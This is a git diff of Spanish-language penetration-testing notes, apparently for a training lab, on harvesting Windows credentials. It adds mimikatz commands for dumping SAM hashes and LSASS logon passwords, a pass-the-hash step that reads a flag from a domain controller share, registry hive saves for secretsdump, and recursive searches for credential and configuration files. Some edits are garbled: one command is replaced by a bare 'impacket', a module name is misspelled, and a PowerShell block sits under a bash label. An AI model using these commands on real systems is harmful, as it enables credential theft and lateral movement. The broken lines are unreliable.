@@ -6,21 +6,24 @@ Sirve principalmente para obtener credenciales de cuentas locales (sistemas no u
 ### Desde la máquina comprometida
 #### Guardar información con `reg.exe` - Máquina comprometida
 ```powershell
-reg.exe save hklm\sam C:\sam.save
-reg.exe save hklm\system C:\system.save
-reg.exe save hklm\security C:\security.save
+reg.exe save hklm\sam C:\Users\public\sam.save
+reg.exe save hklm\system C:\Users\public\system.save
+reg.exe save hklm\security C:\Users\public\security.save
 ```
-
+#### Coon mimikatz
+```powershell
+.\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM
+```
 #### Utilizar `secretsdump.py` - pwnbox
 Con la información extraída, podemos 
 
 ```bash
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > secretsdump.txt
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > secretsdump.txt
 ```
 
 ### Con `nxc`
 ```bash
-nxc smb $target --local-auth -u user -p password --sam > secretsdump.txt
+impacket
 ```
 
 ---
@@ -57,6 +60,16 @@ Se puede obtener información como la que sigue:
 ### Analizar el archivo  `lsass.dmp` con `pypykatz`
 ```
 pypykatz lsa minidump /path/to/lsass.dmp
+```
+
+### Mimikatz
+Utilizando `seurlsa::logonpasswrods` podemos acceder al proceso activo de LSASS y nos puede dar más información que el paso anterior
+```powershell
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# o volcando la información en un archivo
+.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit> output.txt
 ```
 
 ---
@@ -117,6 +130,14 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ---
 
 ## 2. Pass-the-Hash (PtH)
+### Con `mimikatz`
+```powershell
+#privilege::debug
+sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
+	\Desktop
+# Estaremos autenticados como el usuario en el e: 
+type \\DC01\C$\Users\Administrator\Desktop\flag.txt
+```
 
 #### Con `Invoke-TheHash`
  Ejecuta comandos en un sistema remoto a través de protocolos como SMB (`Invoke-SMBExec`) o WMI (`Invoke-WMIExec`). Se puede poner como `target` la dirección IP o el nombre del dispositivo
@@ -384,12 +405,23 @@ findstr /s /i cred n:\*.*
 # powershell
 Get-ChildItem -Recurse -Path n:\ | Select-String "cred" -List
 ```
-### Buscar archivos que puedan contener credenciales
-```cmd
-dir n:\*cred* /s /b 
-# ó en powershell
-csocks
-```
+### Buscar archivos 
+- Que puedan contener credenciales
+	```cmd
+	dir n:\*cred* /s /b 
+	```
+- Que puedan contener archivos de configuración o similar
+	```powershell
+	#cmd
+	dir C:\*.config *.json *.yml *.ini *.conf *.env *.txt /s /p
+	#powershell
+	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.json,*.yml,*.ini,*.conf,*.env,*.txt,*.cnf -ErrorAction SilentlyContinue
+	```
+- Mostrar todos los archivos que no están vacíos en un directorio (no muestra carpetas)
+	```bash
+	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.json,*.yml,*.ini,*.conf,*.env,*.txt,*.cnf -ErrorAction SilentlyContinue
+	```
+
 ### Con `LaZagne`
 ```cmd
 C:\tools> lazagne.exe all
